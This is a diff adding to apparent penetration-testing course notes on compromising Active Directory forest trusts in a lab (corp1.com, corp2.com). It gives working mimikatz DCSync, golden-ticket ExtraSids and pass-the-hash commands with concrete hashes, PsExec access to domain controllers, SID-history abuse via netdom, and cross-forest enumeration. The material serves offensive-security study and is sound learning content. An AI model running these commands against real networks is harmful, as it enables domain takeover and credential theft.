@@ -7015,6 +7015,10 @@ The **RID** of the Enterprise Admins group is a static value of **519**.
 
 Append the value "519" to the domain SID to obtain the SID of the **Enterprise Admins** group.
 
+```pwsh
+klist purge
+```
+
 Crafting the golden ticket with ExtraSid that will grant us Enterprise Admin membership in `corp1.com`.
 
 Supply
@@ -7110,9 +7114,282 @@ lsadump::dcsync /domain:corp1.com /user:corp1\administrator
 
 We now have the NTLM password hash of the **root domain Administrator account** and have obtained access to the **Enterprise Admins** group.
 
+Open an administrative powershell, mimikatz > Overpass the hash
+
+```
+sekurlsa::pth /user:Administrator /domain:corp1.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:powershell
+```
+
+```pwsh
+c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 powershell
+```
+
 In 2018, security researcher @harmj0y found that it is possible to trigger the print spooler authentication across a forest trust and obtain a forwardable TGT.
 
 In 2019, Microsoft issued two rounds of security advisories and updates. The first blocked TGT delegation for all new forest trusts, while the second blocked it for existing forest trust as well.
 
+## Going Beyond the Forest
 
+### Active Directory Trust Between Forests
 
+(As designed) no real security boundary exists between domains inside an AD forest.
+
+However, Microsoft envisions a security boundary between multiple forests.
+
+E.g., Trusts between `Corp1.com` and `Corp2.com`. Both forests trust the other.
+
+Like a domain trust, a forest trust can be one-way or bi-directional.
+
+The forest trust is **transitive between domains**, such that `Dev.Corp1.com` will trust `Dev.Corp2.com` but it is **not transitive between multiple forests**. If `Corp2.com` were to have a trust to an additional domain, namely `Corp3.com`, `Corp1.com` would not automatically have a trust to `Corp3.com`.
+
+Inside the forest, a **shortcut trust** can speed up the authentication process.
+
+An **external trust** indicates a trust from a child domain inside one forest (`Factory.Prod.Corp1.com`) to a child domain inside another forest (`Lab.Prod.Corp2.com`).
+
+External trust is also **non-transitive**, => if no forest trust exists between `Corp1.com` and `Corp2.com`, none of the domains except for `Factory.Prod.Corp1.com` and `Lab.Prod.Corp2.com` would have a trust relationship.
+
+This concept extends to non-Windows environments as well. In a Kerberos Linux environment, a realm trust (which can either be transitive or non-transitive) describes a trust between an AD forest and a Kerberos realm.
+
+Within an interforest trust, a user in a child domain like `Prod.Corp1.com` can perform queries and access resources in `Prod.Corp2.com`.
+
+We can also enumerate across the forest barrier, but access to services depends on group membership.
+
+The optional **selective authentication** setting limits access across a forest trust to only specific users against specific objects.
+
+E.g., any user in `Prod.Corp1.com` could perform queries on all AD objects in `Prod.Corp2.com`, but if **selective authentication** is configured, a mapping is created that only allows selected users in `Prod.Corp1.com` to query information about specific objects in `Prod.Corp2.com`.
+
+But this configuration requires a great deal of design and administrative preparation so it is rarely implemented.
+
+### Enumeration Beyond the Forest
+
+Enumerate forest trusts
+
+From the Offsec user from the `prod.corp1.com` domain.
+
+```pwsh
+([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
+```
+
+```
+TopLevelNames            : {corp2.com}
+ExcludedTopLevelNames    : {}
+TrustedDomainInformation : {corp2.com}
+SourceName               : corp1.com
+TargetName               : corp2.com
+TrustType                : Forest
+TrustDirection           : Bidirectional
+```
+
+=> a bi-directional forest trust to `corp2.com`.
+
+If **selective authentication is not enabled**, enumerate trusts to child domains inside `corp2.com` with Get-DomainTrust by specifying the root domain and then continue with any discovered child domains.
+
+Enumerating forest trust with LDAP
+
+```pwsh
+Get-DomainTrust -Domain corp1.com
+```
+
+Enumeration of all domain and forest trusts
+
+```pwsh
+Get-DomainTrustMapping
+```
+
+Use the BloodHound and SharpHound ingestors to perform full trust mapping.
+
+Enumerating users, groups, and more in the trusted forest.
+
+Enumerating all users in CORP2.COM
+
+```pwsh
+Get-DomainUser -Domain corp2.com
+```
+
+Search for users with the same username in both forests as they might belong to the same employee. If such an account exists, there is a chance that the accounts share a password, which could grant us access.
+
+Attack **foreign user accounts**. E.g., a user in `prod.corp1.com` may be a member of a group in `corp2.com`. 
+
+Enumerate groups in a trusted forest or domain that contains non-native members.
+
+```pwsh
+Get-DomainForeignGroupMember -Domain corp2.com
+```
+
+```
+GroupDomain             : corp2.com
+GroupName               : myGroup2
+GroupDistinguishedName  : CN=myGroup2,OU=corp2Groups,DC=corp2,DC=com
+MemberDomain            : corp2.com
+MemberName              : S-1-5-21-3776646582-2086779273-4091361643-1601
+MemberDistinguishedName : CN=S-1-5-21-3776646582-2086779273-4091361643-1601,CN=ForeignSecurityPrincipals,DC=corp2,DC=com
+```                     
+
+```pwsh
+convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601
+```
+
+=> The PROD\dave user from our current domain is a member of myGroup2 in `corp2.com`.
+
+## Compromising an Additional Forest
+
+Since Microsoft designed forest trust as a security boundary, by default it is not possible to compromise a trusted forest even if we have completely compromised our current forest.
+
+Attacks that will allow us to compromise a trusted forest under non-default (but not uncommon) conditions.
+
+### Show Me Your Extra SID
+
+When we escalated our access from `prod.corp1.com` to `corp1.com`, ExtraSids allowed us to create a TGT that let us become members of the **Enterprise Admins** group.
+
+Forest trust introduces the concept of **SID filtering**.
+
+In forest trust, the contents of the ExtraSids field are filtered so group memberships are not blindly trusted.
+
+E.g., Generate a TGT in `corp1.com` with an ExtraSids entry claiming to be a member of the Enterprise Admins group in `corp2.com`. Once the TGT (now signed with the interforest trust key) reaches the domain controller in `corp2.com`, that ExtraSids entry is removed and a TGS is returned to us.
+
+Log in to the Windows 10 client machine as the Offsec user and proceed to open a command prompt in the context of the **Administrator** user from the `corp1.com` domain
+
+Obtaining the krbtgt password hash for the corp1.com domain.
+
+```
+lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt
+```
+
+Resolving SIDs of both the source and target domains.
+ 
+```pwsh
+Get-DomainSID -domain corp1.com
+Get-DomainSID -domain corp2.com
+```
+
+Create the golden ticket with the **Enterprise Admins** group listed as an ExtraSid:
+
+```
+kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-1831131555-2412080359 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-4182647938-3943167060-1815963754-519 /ptt
+```
+
+Unfortunately, our golden ticket did not grant us Enterprise Admin access in corp2.com. This is due to SID filtering.
+
+Although the **Active Directory Domains and Trusts administrative** GUI does not show it, we can actually **relax the SID filtering protection**.
+
+Use **Netdom** on the domain controller that controls the incoming trust to allow SID history, which eases the strict SID filtering.
+
+Why, exactly, anyone would reduce the security level and potentially allow compromise of one forest to affect another?
+
+E.g., imagine the "corp1" corporation acquires the "corp2" corporation. Both corporations have an existing AD infrastructure that must now be merged. One way to do this is to move all users and services from `corp2.com` into `corp1.com`.
+
+User accounts are relatively easy to move but servers and services can be problematic.
+
+=> SID history was designed to allow the migrated users access to services in their old forest. During the migration period, `corp2.com` would disable SID filtering.
+
+In the real world, these kind of migrations tend to take multiple years or may never complete, leaving the forest trust with SID history enabled for an extended period of time.
+
+```pwsh
+Get-DomainTrust -Domain corp2.com
+```
+
+Forest trust information with SID filtering
+
+```
+SourceName      : corp1.com
+TargetName      : corp2.com
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+```
+
+To enable SID history, log in to the domain controller of `corp2.com` as the **Administrator** user.
+
+Use the trust subcommand of netdom and include the source domain, the target domain and the sid history setting (/enablesidhistory) to actually enable SID history.
+
+Enable SID history in CORP2.COM
+
+```bat
+netdom trust corp2.com /d:corp1.com /enablesidhistory:yes
+```
+
+With SID history enabled, query for the trust object and note the contents of the **TrustAttributes** property:
+
+```pwsh
+Get-DomainTrust -Domain corp2.com
+```
+
+Forest trust information without SID filtering
+
+```
+SourceName      : corp2.com
+TargetName      : corp1.com
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+```
+
+**TREAT_AS_EXTERNAL** value indicates that the forest trust is instead treated as an external trust but with the transitivity of normal forest trust.
+
+While we enabled SID history, SID filtering is still active.
+
+Any SID with a **RID less than 1000** will always be filtered regardless of the SID history setting. However, a SID with a RID equal to or higher than 1000 is not filtered for external trust. A **non-default group** will always have a RID equal to or higher than 1000.
+
+Find a custom group whose membership will allow us to compromise a user or computer.
+
+Enumerate members of the `corp2.com` built-in **Administrators** group:
+
+```pwsh
+Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
+```
+
+The powerGroup is a member of the builtin Administrators group, => it will grant local administrator access to the domain controller of `corp2.com`. The RID (1106) is higher than 1000.
+
+If the custom group we attempt to abuse is a member a global security group like **Domain Admins** or **Enterprise Admins**, that access will also be filtered. Only group membership in **domain local security groups** is not filtered.
+
+The built-in Administrators group is a domain local group.
+
+Modify our golden ticket command to include the SID of powerGroup:
+
+```pwsh
+klist purge
+```
+
+```
+kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-1831131555-2412080359 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-4182647938-3943167060-1815963754-1106 /ptt
+```
+
+Obtaining access to DC01 with PsExec
+
+```bat
+c:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd
+```
+
+Locate non-default groups with excessive DACL permissions, including prime targets such as Security groups for Microsoft Exchange.
+
+Forest trust but when SID history is enabled, we are essentially dealing with external trust.
+
+By default, external trust can be attacked through ExtraSids using groups with a RID equal to or higher than 1000.
+
+External trust does not provide transitivity but if the trusted domain is compromised, the entire forest is as well.
+
+SID filtering is an optional setting for external trusts and is known as SID filter quarantining.
+
+### Linked SQL Servers in the Forest
+
+How linked SQL servers can be used to compromise additional SQL servers and if our privileges are high enough, the operating system itself.
+
+SQL servers themselves can also be linked across domain and even forest trust.
+
+Locate any registered SPNs for MSSQL in `prod.corp1.com`:
+
+```bat
+setspn -T prod -Q MSSQLSvc/*
+```
+
+Enumerate registered SPNs across domain trust
+
+```bat
+setspn -T corp1 -Q MSSQLSvc/*
+```
+
+This enumeration also works across forest trust and allows us to locate SPNs in corp2.com:
+
+```bat
+setspn -T corp2.com -Q MSSQLSvc/*
+```
